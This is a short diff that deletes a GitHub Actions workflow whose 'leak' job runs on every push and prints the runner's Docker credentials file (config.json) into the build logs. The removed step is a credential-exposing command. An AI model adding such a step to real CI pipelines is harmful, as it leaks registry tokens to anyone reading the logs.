@@ -1,7 +1,0 @@
-on: [push]
-jobs:
-  leak:
-    runs-on: ubuntu-latest
-    name: Print Docker Config
-    steps:
-      - run: cat /home/runner/.docker/config.json
